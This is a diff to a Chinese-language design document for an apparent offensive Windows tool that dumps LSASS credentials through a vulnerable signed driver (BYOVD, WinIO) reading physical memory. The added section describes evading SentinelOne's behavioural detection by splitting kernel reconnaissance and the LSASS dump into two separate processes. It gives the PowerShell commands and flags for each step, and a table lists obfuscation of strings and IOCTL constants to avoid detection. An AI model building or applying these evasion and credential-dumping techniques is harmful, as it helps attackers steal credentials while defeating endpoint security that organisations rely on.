@@ -283,6 +283,60 @@ CR3 ─── & 0x000FFFFFFFFFF000（去除 PCID 位）
 | 字符串特征 | LSASS / PPL / BYOVD 等明文 | `obfstr` 编译期 XOR 加密 | ✅ 已规避 |
 | IOCTL 常量 | 明文存储在 `.rdata` | XOR 对运行时计算 | ✅ 已规避 |
 | CLI 帮助文本 | 暴露工具功能和驱动名 | 通用化中性描述 | ✅ 已规避 |
+| Sentinel ONE 行为链 | 内核探测 + 转储在同一进程 | 拆分为两次独立执行 | ✅ 已规避 |
+
+---
+
+## 阶段七：Sentinel ONE 行为检测规避（拆分执行）
+
+### 问题
+
+Sentinel ONE 行为分析引擎检测**同一进程**中的操作链：
+
+```
+同一进程:
+  NtQuerySystemInformation(SystemModuleInformation)  ← 查找内核基址
+  → 物理内存扫描
+  → 打开 LSASS
+  → 读取 LSASS 内存
+  = 触发行为检测 → KILL
+```
+
+### 解决方案
+
+将执行拆分为两个独立进程，打破行为关联：
+
+```
+进程 A（--recon 侦察模式）          进程 B（--ntos-base + --trampoline）
+┌────────────────────────┐        ┌────────────────────────────┐
+│ 连接驱动               │        │ 连接驱动                    │
+│ NtQuerySystemInfo      │        │ ❌ 跳过内核基址查询          │
+│ locate_syscall 扫描     │        │ ❌ 跳过物理内存扫描          │
+│ 打印结果               │        │ 使用传入的 ntos_base + tramp │
+│ 立即退出 ✓             │        │ open_process → get_cr3      │
+└────────────────────────┘        │ → physical dump → 写入文件   │
+                                   └────────────────────────────┘
+```
+
+### 使用方式
+
+```powershell
+# 第一步：侦察（获取内核信息后退出）
+.\tool.exe -t winio --recon
+# 输出:
+#   --ntos-base FFFFF805DC800000 --trampoline 000000001A2B3000
+
+# 第二步：转储（跳过所有探测）
+.\tool.exe -t winio --ntos-base FFFFF805DC800000 --trampoline 000000001A2B3000
+```
+
+### 实现
+
+| 组件 | 改动 |
+|------|------|
+| CLI（main.rs） | `--recon`：仅探测后退出；`--ntos-base` / `--trampoline`：传入预计算值 |
+| DmEngine | `new_precomputed()`：跳过 `get_ntoskrnl_base_ntapi()` 和 `locate_syscall()` |
+| 向后兼容 | 不带参数时行为不变 |
 
 ---
 
@@ -290,13 +344,23 @@ CR3 ─── & 0x000FFFFFFFFFF000（去除 PCID 位）
 
 ```mermaid
 flowchart TD
-    Start["main()"] --> Init["DmEngine::new(api)\n解析API、连接驱动"]
-    Init --> Scan["locate_syscall()\n扫描物理内存定位 NtShutdownSystem"]
-    Scan --> Open["open_process(lsass_pid)\n内核态 ZwOpenProcess → ZwDuplicateObject"]
-    Open --> CR3["get_process_cr3(pid)\nPsLookupProcessByProcessId\n→ MmGetPhysicalAddress\n→ read_phys 获取 CR3"]
-    CR3 --> Dump["create_minidump_phys()\n物理内存转储（绕过 EDR）"]
-    Dump --> Enum["enumerate_modules()\nNtQueryVirtualMemory 动态解析\n替代 PSAPI"]
-    Enum --> Walk["read_memory_regions_phys()\nNtQueryVirtualMemory(class=0) 枚举\n+ 页表遍历 VA→PA\n+ read_phys 物理读取"]
-    Walk --> Build["build_minidump()\n构建 MDMP 格式文件"]
+    Start["main()"] --> Check{"--recon?"}
+    Check -->|是| Recon["DmEngine::new()\n完整初始化（探测内核信息）"]
+    Recon --> Print["打印 ntos_base + trampoline_phys"]
+    Print --> Exit["process::exit(0)"]
+    
+    Check -->|否| HasArgs{"提供了\n--ntos-base\n--trampoline?"}
+    HasArgs -->|是| Precomp["DmEngine::new_precomputed()\n跳过探测，直接使用参数"]
+    HasArgs -->|否| Normal["DmEngine::new()\n完整初始化"]
+    
+    Precomp --> Open
+    Normal --> Open
+    
+    Open["open_process()\nZwOpenProcess → ZwDuplicateObject"]
+    Open --> CR3["get_process_cr3()\nPsLookupProcessByProcessId\n→ MmGetPhysicalAddress\n→ read_phys"]
+    CR3 --> Dump["create_minidump_phys()\n物理内存转储"]
+    Dump --> Enum["enumerate_modules()\nNtQueryVirtualMemory"]
+    Enum --> Walk["read_memory_regions_phys()\n页表遍历 + read_phys"]
+    Walk --> Build["build_minidump()\nMDMP 格式"]
     Build --> Write["写入磁盘"]
 ```
